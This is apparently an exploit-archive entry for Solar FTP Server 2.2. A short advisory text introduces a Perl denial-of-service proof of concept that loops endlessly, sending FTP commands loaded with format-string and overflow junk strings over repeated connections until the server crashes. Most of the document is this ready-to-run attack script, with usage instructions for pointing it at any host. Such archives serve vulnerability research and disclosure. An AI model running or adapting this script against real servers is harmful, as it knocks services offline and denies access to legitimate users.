@@ -1,0 +1,80 @@
+source: http://www.securityfocus.com/bid/54306/info
+
+Solar FTP Server is prone to a remote denial-of-service vulnerability.
+
+An attacker can exploit this issue to force the affected application to become unresponsive, denying service to legitimate users.
+
+Solar FTP Server 2.2 is vulnerable; other versions may also be affected. 
+
+# Exploit Title: Solar FTP Server 2.2 Remote DOS crash POC
+# crash:http://img542.imageshack.us/img542/7633/solar.jpg
+# Date: July 4, 2012
+# Author: coolkaveh
+# coolkaveh () rocketmail com
+# https://twitter.com/coolkaveh
+# Vendor Homepage: http://solarftp.com/
+# Version: 2.2
+# Tested on: windows XP SP3
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#When sending multiple parallel crafted request to a Solar FTP Server
+it gets crash
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# Crappy Solar FTP Server Remote Denial Of Service
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#!/usr/bin/perl -w
+use IO::Socket;
+use Parallel::ForkManager;
+$|=1;
+sub usage {
+    print "Crappy FTP Server Remote Denial Of Service\n";
+    print "by coolkaveh\n";
+    print "usage: perl killftp.pl <host> \n";
+    print "example: perl Crappyftp.pl www.example.com \n";
+}
+$host=shift;
+$port=shift || "21";
+if(!defined($host)){
+    print "Crappy FTP Server Remote Denial Of Service\n";
+    print "by coolkaveh\n";
+        print "coolkaveh () rocketmail com\n";
+    print "usage: perl killftp.pl <host> \n";
+    print "example: perl Crappyftp.pl www.example.com \n";
+        exit(0);
+}
+$check_first=IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>$port,Timeout=>60);
+if(defined $check_first){
+        print "$host -> $port is alive.\n";
+        $check_first->close;
+}
+else{
+die("$host -> $port is closed!\n");
+}
+@junk=('A'x5,'l%q%j%z%Z'x1000,
+'%s%p%x%d','024d','%.2049d','%p%p%p%p','%x%x%x%x','%d%d%d%d','%s%s%s%s','%99999999999s',
+'%08x','%%20d','%%20n','%%20x','%%20s','%s%s%s%s%s%s%s%s%s%s','%p%p%p%p%p%p%p%p%p%p',
+'%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%','%s'x129,'%x'x57,'-1','0','0x100',
+'0x1000','0x3fffffff','0x7ffffffe','0x7fffffff','0x80000000','0xfffffffe','0xffffffff','0x10000','0x100000','1',
+);
+@command=(
+'NLST','CWD','STOR','RETR','RMD','DELE','RNFR','RNTO','LIST','MDTM','SIZE','STAT','ACCT','HELP','MODE',
+'APPE','STRU','SITE','SITE INDEX','TYPE','TYPE A','TYPE E','TYPE
+L','TYPE I','NLST','CWD','MKD','RMD',
+'DELE','RNFR','RNTO','LIST','MDTM','SIZE','STAT','ACCT','HELP','MODE',
+'APPE','STRU','SITE','SITE INDEX','TYPE','TYPE A','TYPE E','TYPE
+L','TYPE I','NLST','CWD',
+);
+print "Crashing Server!\n";
+while (1) {
+   COMMAND_LIST: foreach $cmd (@command){
+        foreach $poc (@junk){
+                LABEL5: $sock4=IO::Socket::INET->new(PeerAddr=>$host,
+PeerPort=>$port, Proto=>'tcp', Timeout=>30);
+                if(defined($sock4)){
+                $sock4->send("$cmd"." "."$poc\r\n", 0);
+                $sock4->send("$poc\r\n", 0);
+                        
+                                }
+                        }
+                }               
+
+}
